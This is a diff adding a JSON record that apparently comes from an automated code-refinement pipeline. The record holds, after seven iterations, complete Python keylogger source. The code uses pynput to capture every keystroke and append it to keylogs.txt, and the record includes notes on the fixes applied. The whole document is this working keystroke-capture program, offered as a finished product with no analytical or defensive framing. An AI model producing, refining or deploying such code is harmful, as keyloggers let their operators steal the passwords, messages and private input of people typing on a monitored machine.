@@ -1,0 +1,11 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if isinstance(key, keyboard.Key):\n                if key == keyboard.Key.esc:\n                    return False\n                elif key == keyboard.Key.enter:\n                    f.write('\\n')\n                    print('[ENTER]')\n                elif key == keyboard.Key.space:\n                    f.write(' ')\n                    print('[SPACE]')\n                else:\n                    f.write(f'[KEY:{key.name.upper()}]')\n                    print(f'[KEY:{key.name.upper()}]')\n            else:\n                f.write(str(key.char))\n                print(str(key.char))\n    except FileNotFoundError as e:\n        print(f'FileNotFoundError: {e}')\n    except PermissionError as e:\n        print(f'PermissionError: {e}')\n    except IOError as e:\n        print(f'IOError: {e}')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\nlistener = keyboard.Listener(on_press=on_press)\nlistener.start()\ntry:\n    listener.join()\nexcept KeyboardInterrupt:\n    pass",
+  "notes": "Addressed special key formatting, ensured file handle closure on ESC press, added debug prints, and expanded exception handling.",
+  "applied_fixes": [
+    "iteration6_issue1",
+    "iteration6_issue2",
+    "iteration6_issue3",
+    "iteration6_issue4"
+  ],
+  "iterations": 7
+}
